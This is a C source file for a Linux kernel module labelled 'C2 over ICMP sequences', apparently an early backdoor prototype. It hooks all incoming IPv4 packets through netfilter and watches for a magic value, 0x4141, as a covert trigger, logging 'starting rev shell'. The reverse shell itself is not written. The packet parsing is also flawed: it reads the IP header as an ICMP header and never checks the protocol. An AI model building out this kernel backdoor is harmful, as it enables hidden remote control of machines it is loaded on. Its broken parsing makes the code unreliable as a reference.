#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/icmp.h>


MODULE_AUTHOR("Declan Murphy");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("C2 over ICMP sequences");
MODULE_VERSION("1.0");

static struct nf_hook_ops *nfho = NULL;

static unsigned int c2_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
    struct icmphdr *pkt = (struct icmphdr *) skb_network_header(skb); //cast skb/packet struct to icmphdr
    uint16_t unused_header = be16_to_cpu(pkt->un.frag.__unused);
    if (unused_header == 0x4141) {
	printk(KERN_INFO "Got the ICMP sequence, starting rev shell\n");
    }

    return NF_ACCEPT;
}

static int __init c2_init(void) {
    printk(KERN_INFO "Initializing module\n"); //KERN_INFO is log level flag
					       
    nfho = (struct nf_hook_ops*) kcalloc(1, sizeof(struct nf_hook_ops), GFP_KERNEL);
    nfho->hook = c2_hook; //callback function for processing when below conditions met
    nfho->hooknum = NF_INET_PRE_ROUTING; //when a packet reaches the machine
    nfho->pf = PF_INET; //ipv4
    nfho->priority = NF_IP_PRI_FIRST; //highest level hook priority

    nf_register_net_hook(&init_net, nfho);
    return 0;
}

static void __exit c2_exit(void) {
    printk(KERN_INFO "Module exiting\n"); //printk outputs to kernel's log
    nf_unregister_net_hook(&init_net, nfho);
    kfree(nfho);
}

module_init(c2_init);
module_exit(c2_exit);
